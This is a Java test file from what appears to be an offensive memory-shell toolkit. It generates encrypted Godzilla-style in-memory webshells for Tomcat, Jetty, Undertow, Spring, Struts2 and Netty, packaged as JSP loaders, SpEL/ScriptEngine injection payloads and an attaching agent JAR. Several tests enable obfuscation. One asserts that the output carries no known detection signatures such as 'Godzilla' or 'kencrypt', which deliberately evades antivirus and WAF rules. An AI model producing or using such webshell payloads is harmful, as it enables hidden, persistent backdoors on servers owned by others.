package com.reajason.javaweb.memshell.shelltool.godzilla.hw;

import com.reajason.javaweb.Server;
import com.reajason.javaweb.memshell.MemShellGenerator;
import com.reajason.javaweb.memshell.MemShellResult;
import com.reajason.javaweb.memshell.PackerRegistry;
import com.reajason.javaweb.memshell.ShellTool;
import com.reajason.javaweb.memshell.ToolConfigFactory;
import com.reajason.javaweb.memshell.ShellType;
import com.reajason.javaweb.memshell.config.InjectorConfig;
import com.reajason.javaweb.memshell.config.ObfuscationConfig;
import com.reajason.javaweb.memshell.config.ShellConfig;
import com.reajason.javaweb.packer.Packers;
import net.bytebuddy.jar.asm.Opcodes;
import org.junit.jupiter.api.Test;

import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;


/**
 * 生成期验证：四种加密器各自命中独立模板，产物落到 target/hw 下供本地容器测试。
 *
 * @author ReaJason
 */
class GodzillaHwGenerateTest {

    private static final GodzillaHwCryption[] HTTP_CRYPTIONS = {
            GodzillaHwCryption.JAVA_AES_BASE64,
            GodzillaHwCryption.JAVA_AES_RAW,
            GodzillaHwCryption.JAVA_AES_RAW_BASE64,
            GodzillaHwCryption.JAVA_AES_BASE64_PRO,
            GodzillaHwCryption.JAVA_AES_BASE64_PROFILE,
    };

    @Test
    void generateFilterPerCryption() throws Exception {
        Path output = Paths.get("build", "hw");
        Files.createDirectories(output);
        for (GodzillaHwCryption cryption : HTTP_CRYPTIONS) {
            MemShellResult result = generate(Server.Tomcat, ShellType.FILTER, cryption);
            Path jsp = output.resolve("filter-" + cryption.name() + ".jsp");
            Files.write(jsp, PackerRegistry.getInstance()
                    .pack(Packers.ClassLoaderJSP, result)
                    .getBytes(StandardCharsets.UTF_8));
            System.out.println(cryption + " shell=" + result.getShellClassName()
                    + " size=" + result.getShellSize() + " jsp=" + jsp.toAbsolutePath());
        }
    }

    @Test
    void generateTomcatShellTypes() throws Exception {
        Path output = Paths.get("build", "hw");
        Files.createDirectories(output);
        String[] shellTypes = {ShellType.FILTER, ShellType.VALVE, ShellType.LISTENER, ShellType.SERVLET, ShellType.PROXY_VALVE,
                ShellType.JAKARTA_FILTER, ShellType.JAKARTA_SERVLET, ShellType.JAKARTA_LISTENER};
        for (String shellType : shellTypes) {
            for (GodzillaHwCryption cryption : HTTP_CRYPTIONS) {
                MemShellResult result = generate(Server.Tomcat, shellType, cryption);
                Path jsp = output.resolve("tomcat-" + shellType + "-" + cryption.name() + ".jsp");
                Files.write(jsp, PackerRegistry.getInstance()
                        .pack(Packers.ClassLoaderJSP, result)
                        .getBytes(StandardCharsets.UTF_8));
                System.out.println(shellType + "/" + cryption + " shell=" + result.getShellClassName()
                        + " size=" + result.getShellSize());
            }
        }
    }

    @Test
    void generateOtherServers() throws Exception {
        Path output = Paths.get("build", "hw");
        Files.createDirectories(output);
        generateServer(output, Server.Jetty, new String[]{ShellType.FILTER, ShellType.HANDLER,
                ShellType.LISTENER, ShellType.SERVLET});
        generateServer(output, Server.Undertow, new String[]{ShellType.FILTER, ShellType.SERVLET,
                ShellType.LISTENER, ShellType.UNDERTOW_AGENT_SERVLET_HANDLER});
        generateServer(output, Server.SpringWebMvc, new String[]{ShellType.SPRING_WEBMVC_INTERCEPTOR,
                ShellType.SPRING_WEBMVC_CONTROLLER_HANDLER});
        generateServer(output, Server.Struts2, new String[]{ShellType.ACTION});
    }

    private void generateServer(Path output, String server, String[] shellTypes) throws Exception {
        for (String shellType : shellTypes) {
            for (GodzillaHwCryption cryption : HTTP_CRYPTIONS) {
                MemShellResult result = generate(server, shellType, cryption);
                Path jsp = output.resolve(server + "-" + shellType + "-" + cryption.name() + ".jsp");
                Files.write(jsp, PackerRegistry.getInstance()
                        .pack(Packers.ClassLoaderJSP, result)
                        .getBytes(StandardCharsets.UTF_8));
                System.out.println(server + "/" + shellType + "/" + cryption
                        + " shell=" + result.getShellClassName() + " size=" + result.getShellSize());
            }
        }
    }

    @Test
    void generateExpressionPayloads() throws Exception {
        Path output = Paths.get("build", "hw");
        Files.createDirectories(output);
        generatePayloads(output, Server.Undertow, new String[]{ShellType.FILTER, ShellType.SERVLET,
                ShellType.LISTENER, ShellType.UNDERTOW_AGENT_SERVLET_HANDLER}, Packers.SpEL, "/*");
        generatePayloads(output, Server.SpringWebMvc, new String[]{ShellType.SPRING_WEBMVC_INTERCEPTOR,
                ShellType.SPRING_WEBMVC_CONTROLLER_HANDLER}, Packers.SpEL, "/hw");
        generatePayloads(output, Server.Struts2, new String[]{ShellType.ACTION}, Packers.ScriptEngine, "/hw");
    }

    private void generatePayloads(Path output, String server, String[] shellTypes,
                                  String packer, String urlPattern) throws Exception {
        for (String shellType : shellTypes) {
            for (GodzillaHwCryption cryption : HTTP_CRYPTIONS) {
                MemShellResult result = generate(server, shellType, cryption, urlPattern);
                String payload = PackerRegistry.getInstance().pack(packer, result);
                Path file = output.resolve("expr-" + server + "-" + shellType + "-" + cryption.name() + ".txt");
                Files.write(file, payload.getBytes(StandardCharsets.UTF_8));
                System.out.println(server + "/" + shellType + "/" + cryption + " " + packer
                        + " shell=" + result.getShellClassName() + " injector=" + result.getInjectorClassName());
            }
        }
    }

    @Test
    void generateObfuscated() throws Exception {
        Path output = Paths.get("build", "hw");
        Files.createDirectories(output);
        for (GodzillaHwCryption cryption : new GodzillaHwCryption[]{
                GodzillaHwCryption.JAVA_AES_BASE64,
                GodzillaHwCryption.JAVA_AES_RAW,
                GodzillaHwCryption.JAVA_AES_BASE64_PRO,
                GodzillaHwCryption.JAVA_AES_BASE64_PROFILE}) {
            MemShellResult result = new MemShellGenerator().generate(
                    ShellConfig.builder()
                            .server(Server.Tomcat)
                            .shellTool(ShellTool.GodzillaHw)
                            .shellType(ShellType.FILTER)
                            .targetJreVersion(Opcodes.V1_6)
                            .obfuscation(ObfuscationConfig.enabled())
                            .build(),
                    InjectorConfig.builder().urlPattern("/*").build(),
                    GodzillaHwConfig.builder()
                            .pass("Pass1234")
                            .key("Key12345")
                            .headerName("X-Gate")
                            .headerValue("test-gate")
                            .cryption(cryption)
                            .build());
            Path jsp = output.resolve("obf-filter-" + cryption.name() + ".jsp");
            Files.write(jsp, PackerRegistry.getInstance()
                    .pack(Packers.ClassLoaderJSP, result)
                    .getBytes(StandardCharsets.UTF_8));
            System.out.println("obf " + cryption + " shell=" + result.getShellClassName()
                    + " size=" + result.getShellSize());
        }
    }

    @Test
    void generateAgentJar() throws Exception {
        MemShellResult result = new MemShellGenerator().generate(
                ShellConfig.builder()
                        .server(Server.Tomcat)
                        .shellTool(ShellTool.GodzillaHw)
                        .shellType(ShellType.AGENT_FILTER_CHAIN)
                        .targetJreVersion(Opcodes.V1_6)
                        .build(),
                InjectorConfig.builder().build(),
                GodzillaHwConfig.builder()
                        .pass("Pass1234")
                        .key("Key12345")
                        .headerName("X-Gate")
                        .headerValue("test-gate")
                        .cryption(GodzillaHwCryption.JAVA_AES_BASE64)
                        .build());
        String payload = PackerRegistry.getInstance().pack(Packers.AgentJarWithJREAttacher, result);
        Path jar = Paths.get("build", "hw", "agent-filter-chain.jar");
        Files.write(jar, java.util.Base64.getDecoder().decode(payload));
        System.out.println("agent jar=" + jar.toAbsolutePath() + " shell=" + result.getShellClassName()
                + " size=" + result.getShellSize());
    }

    @Test
    void generateNettyPayloads() throws Exception {
        Path output = Paths.get("build", "hw");
        Files.createDirectories(output);
        for (GodzillaHwCryption cryption : HTTP_CRYPTIONS) {
            MemShellResult result = generate(Server.SpringWebFlux, ShellType.NETTY_HANDLER, cryption);
            String payload = PackerRegistry.getInstance().pack(Packers.DefaultBase64, result);
            Path file = output.resolve("netty-" + cryption.name() + ".b64");
            Files.write(file, payload.getBytes(StandardCharsets.UTF_8));
            System.out.println("NettyHandler/" + cryption + " shell=" + result.getShellClassName()
                    + " size=" + result.getShellSize() + " injector=" + result.getInjectorClassName());
        }
    }

    @Test
    void generateWebSocketPayloads() throws Exception {
        Path output = Paths.get("build", "hw");
        Files.createDirectories(output);
        for (String shellType : new String[]{ShellType.WEBSOCKET, ShellType.RAW_WEBSOCKET,
                ShellType.JAKARTA_WEBSOCKET, ShellType.JAKARTA_RAW_WEBSOCKET}) {
            MemShellResult result = generate(Server.Tomcat, shellType,
                    GodzillaHwCryption.JAVA_WEB_SOCKET_AES_RAW, "/hwws");
            Path jsp = output.resolve("ws-" + shellType + ".jsp");
            Files.write(jsp, PackerRegistry.getInstance()
                    .pack(Packers.ClassLoaderJSP, result)
                    .getBytes(StandardCharsets.UTF_8));
            System.out.println(shellType + " shell=" + result.getShellClassName()
                    + " size=" + result.getShellSize() + " helper=" + result.getHelperClassName());
        }
    }

    @Test
    void configDescriptorExposesCryptionEnum() {
        ToolConfigFactory.ToolConfigDescriptor descriptor = ToolConfigFactory.describeAll().stream()
                .filter(d -> ShellTool.GodzillaHw.equals(d.getTool()))
                .findFirst()
                .orElseThrow(() -> new AssertionError("GodzillaHw descriptor missing"));
        ToolConfigFactory.ConfigParam cryption = descriptor.getParams().stream()
                .filter(p -> "cryption".equals(p.getName()))
                .findFirst()
                .orElseThrow(() -> new AssertionError("cryption param missing"));
        org.junit.jupiter.api.Assertions.assertEquals("enum", cryption.getType());
        org.junit.jupiter.api.Assertions.assertEquals(
                java.util.Arrays.asList(GodzillaHwCryption.values()).stream()
                        .map(Enum::name).collect(java.util.stream.Collectors.toList()),
                cryption.getOptions());
    }

    @Test
    void jakartaRawClassLoads() throws Exception {
        for (boolean debug : new boolean[]{false, true}) {
            MemShellResult result = new MemShellGenerator().generate(
                    ShellConfig.builder()
                            .server(Server.Tomcat)
                            .shellTool(ShellTool.GodzillaHw)
                            .shellType(ShellType.JAKARTA_FILTER)
                            .targetJreVersion(Opcodes.V1_6)
                            .debug(debug)
                            .build(),
                    InjectorConfig.builder().urlPattern("/*").build(),
                    GodzillaHwConfig.builder()
                            .pass("Pass1234")
                            .key("Key12345")
                            .headerName("X-Gate")
                            .headerValue("test-gate")
                            .cryption(GodzillaHwCryption.JAVA_AES_RAW)
                            .build());
            Class<?> clazz = com.reajason.javaweb.utils.ClassDefiner.defineClass(result.getShellBytes());
            Object instance = clazz.getDeclaredConstructor().newInstance();
            System.out.println("jakarta raw debug=" + debug + " loaded " + instance.getClass().getName());
        }
    }

    @Test
    void noLegacyJmgStaticSignatures() {
        String[] bad = {"Godzilla", "kencrypt", "kdecrypt", "_pfGet", "_pfMd5", "SHELL_B64",
                "AbstractMatcher", "SignatureUtils", "NetworkUtils"};
        for (GodzillaHwCryption cryption : HTTP_CRYPTIONS) {
            MemShellResult result = generate(Server.Tomcat, ShellType.FILTER, cryption);
            String ascii = new String(result.getShellBytes(), StandardCharsets.ISO_8859_1);
            for (String signature : bad) {
                org.junit.jupiter.api.Assertions.assertFalse(ascii.contains(signature),
                        cryption + " shell still contains static signature: " + signature);
            }
        }
    }

    @Test
    void printCatalog() {
        MemShellGenerator generator = new MemShellGenerator();
        org.junit.jupiter.api.Assertions.assertTrue(
                generator.getSupportedTools().contains(ShellTool.GodzillaHw),
                "GodzillaHw tool must be registered via SPI");
        for (String server : generator.getSupportedServers()) {
            System.out.println(server + " -> "
                    + generator.getShellTypeCatalog().getShellTypes(server, ShellTool.GodzillaHw));
        }
    }

    private MemShellResult generate(String server, String shellType, GodzillaHwCryption cryption) {
        return generate(server, shellType, cryption, "/*");
    }

    private MemShellResult generate(String server, String shellType, GodzillaHwCryption cryption, String urlPattern) {
        return new MemShellGenerator().generate(
                ShellConfig.builder()
                        .server(server)
                        .serverVersion(Server.Jetty.equals(server) ? "7+" : "unknown")
                        .shellTool(ShellTool.GodzillaHw)
                        .shellType(shellType)
                        .targetJreVersion(Opcodes.V1_6)
                        .build(),
                InjectorConfig.builder().urlPattern(urlPattern).build(),
                GodzillaHwConfig.builder()
                        .pass("Pass1234")
                        .key("Key12345")
                        .headerName("X-Gate")
                        .headerValue("test-gate")
                        .cryption(cryption)
                        .build());
    }
}
